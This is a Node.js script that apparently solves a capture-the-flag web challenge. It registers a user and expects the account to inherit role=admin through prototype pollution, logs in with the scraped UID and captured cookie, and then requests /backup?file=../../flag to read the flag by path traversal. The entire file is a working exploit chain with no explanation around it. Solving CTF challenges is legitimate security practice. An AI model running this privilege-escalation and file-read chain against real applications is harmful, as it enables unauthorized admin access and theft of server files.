
const http = require('http');
const querystring = require('querystring');

console.log("Registering new user... (should inherit role=admin from prototype)");
const postData = querystring.stringify({
  "username": "trygetbackup"
});

const opts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/register',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(postData)
  }
};

const req = http.request(opts, function(res) {
  let body = '';
  res.on('data', function(chunk) { body += chunk; });
  res.on('end', function() {
    let match = body.match(/<span.*?>([a-f0-9]+)<\/span>/);
    if (match) {
      let uid = match[1];
      console.log(`Got UID: ${uid}, logging in...`);
      const loginData = querystring.stringify({uid: uid});
      const loginOpts = {
        hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
        port: 80,
        path: '/login',
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(loginData)
        }
      };
      const loginReq = http.request(loginOpts, function(loginRes) {
        let cookie = loginRes.headers['set-cookie'].map(function(c) { return c.split(';')[0]; }).join('; ');
        console.log("Logged in, trying GET /backup?file=../../flag");
        const backupOpts = {
          hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
          port: 80,
          path: '/backup?file=../../flag',
          method: 'GET',
          headers: {
            'Cookie': cookie
          }
        };
        const backupReq = http.request(backupOpts, function(backupRes) {
          let backupBody = '';
          backupRes.on('data', function(chunk) { backupBody += chunk; });
          backupRes.on('end', function() {
            console.log("\n\n🏁 FINAL RESULT:");
            console.log(backupBody);
          });
        });
        backupReq.end();
      });
      loginReq.write(loginData);
      loginReq.end();
    } else {
        console.log("No UID found:");
        console.log(body);
      }
  });
});

req.on('error', function(err) { console.error(err); });
req.write(postData);
req.end();
